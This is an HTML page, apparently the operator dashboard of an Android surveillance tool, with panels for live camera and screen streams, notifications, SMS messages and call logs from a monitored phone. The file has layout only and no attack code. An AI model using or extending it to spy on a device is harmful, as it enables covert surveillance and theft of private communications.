<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Android Surveillance Dashboard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    :root {
      --primary-dark: #1e3a8a;
      --primary-light: #3b82f6;
      --background-dark: #0f172a;
      --background-secondary: #1e293b;
      --text-light: #f1f5f9;
      --text-secondary: #94a3b8;
      --accent: #22d3ee;
    }

    body {
      background-color: var(--background-dark);
      color: var(--text-light);
    }

    /* Fade-in animation for elements */
    .fade-in {
      animation: fadeIn 0.5s ease-in;
    }

    @keyframes fadeIn {
      0% { opacity: 0; transform: translateY(10px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    /* Scale animation for hover effects */
    .hover-scale {
      transition: transform 0.3s ease;
    }

    .hover-scale:hover {
      transform: scale(1.02);
    }

    /* Pulse animation for status dot */
    .status-dot {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { opacity: 1; }
      50% { opacity: 0.4; }
      100% { opacity: 1; }
    }

    /* Video container default aspect ratio */
    .video-aspect-camera {
      aspect-ratio: 4 / 3; /* Matches 640x480 camera */
    }

    .video-aspect-screen {
      aspect-ratio: 16 / 9; /* Matches 960x540 screen */
    }

    /* Styling for notification, SMS, and call log entries */
    .data-entry {
      padding: 0.5rem;
      margin-bottom: 0.5rem;
      border-left: 3px solid var(--accent);
      background: rgba(0, 0, 0, 0.3);
      border-radius: 0.25rem;
      transition: background 0.3s ease;
    }

    .data-entry:hover {
      background: rgba(0, 0, 0, 0.5);
    }

    .data-entry p {
      margin: 0;
      display: -webkit-box;
      -webkit-line-clamp: 2;
      line-clamp: 2;
      -webkit-box-orient: vertical;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    /* Responsive video containers */
    @media (max-width: 1024px) {
      .video-aspect-camera, .video-aspect-screen {
        aspect-ratio: auto;
        max-height: 400px;
      }
    }
  </style>
</head>
<body class="min-h-screen flex flex-col font-sans antialiased">
<div class="dashboard flex-1 max-w-7xl mx-auto w-full p-4">
  <header class="fade-in flex items-center justify-center py-6 bg-[var(--background-secondary)] rounded-lg shadow-lg mb-4">
    <h1 class="text-3xl font-bold text-[var(--primary-light)] uppercase tracking-wide">Android Surveillance Hub</h1>
  </header>
  <div class="main-content flex flex-col gap-4">
    <!-- Row 1: Camera Video -->
    <div class="row-1 grid grid-cols-3 gap-4">
      <div class="col-span-3 video-container bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in video-aspect-camera">
        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Camera Stream</h2>
        <video id="remoteVideo" autoplay playsinline class="w-full h-full rounded-md border border-[var(--primary-dark)] bg-black object-contain"></video>
      </div>
    </div>
    <!-- Row 2: Screen-Sharing Video and Notifications -->
    <div class="row-2 grid grid-cols-3 gap-4">
      <div class="col-span-2 video-container bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in video-aspect-screen" id="screen-video-container">
        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Screen Stream</h2>
        <video id="screenVideo" autoplay playsinline class="w-full h-full rounded-md border border-[var(--primary-dark)] bg-black object-contain"></video>
      </div>
      <div class="notifications-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Live Notifications</h2>
        <div id="notifications" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md h-80 overflow-y-auto">
          <p>Waiting for notifications...</p>
        </div>
      </div>
    </div>
    <!-- Row 3: SMS and Call Logs -->
    <div class="row-3 grid grid-cols-2 gap-4">
      <div class="sms-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">SMS Messages</h2>
        <div id="sms" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md h-64 overflow-y-auto">
          <p>Waiting for SMS...</p>
        </div>
      </div>
      <div class="call-logs-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Call Logs</h2>
        <div id="call-logs" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md h-64 overflow-y-auto">
          <p>Waiting for call logs...</p>
        </div>
      </div>
    </div>
    <!-- Status Panel -->
    <div class="status-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
      <div class="flex items-center gap-2 mb-2">
        <span class="status-dot w-3 h-3 rounded-full bg-[var(--accent)]"></span>
        <h2 class="text-lg font-semibold text-[var(--text-light)]">Stream Status</h2>
      </div>
      <div id="status" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md mb-2">Waiting for Android stream...</div>
      <div class="status-details grid grid-cols-2 gap-2 text-sm">
        <div>
          <p><strong>Connection:</strong> <span id="connection-status">Disconnected</span></p>
          <p><strong>Camera Resolution:</strong> <span id="camera-resolution">N/A</span></p>
          <p><strong>Screen Resolution:</strong> <span id="screen-resolution">N/A</span></p>
        </div>
        <div>
          <p><strong>Web Client ID:</strong> <span id="web-client-id">N/A</span></p>
          <p><strong>Android Client ID:</strong> <span id="android-client-id">N/A</span></p>
          <p><strong>Frame Rate:</strong> <span id="frame-rate">N/A</span></p>
        </div>
      </div>
      <div class="controls flex gap-2 mt-2">
        <button id="mute-audio" class="hover-scale bg-[var(--primary-dark)] text-[var(--text-light)] px-4 py-2 rounded-md hover:bg-[var(--primary-light)] transition-colors">Mute Audio</button>
        <button id="pause-video" class="hover-scale bg-[var(--primary-dark)] text-[var(--text-light)] px-4 py-2 rounded-md hover:bg-[var(--primary-light)] transition-colors">Pause Video</button>
      </div>
    </div>
  </div>
</div>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script src="client.js"></script>
</body>
</html>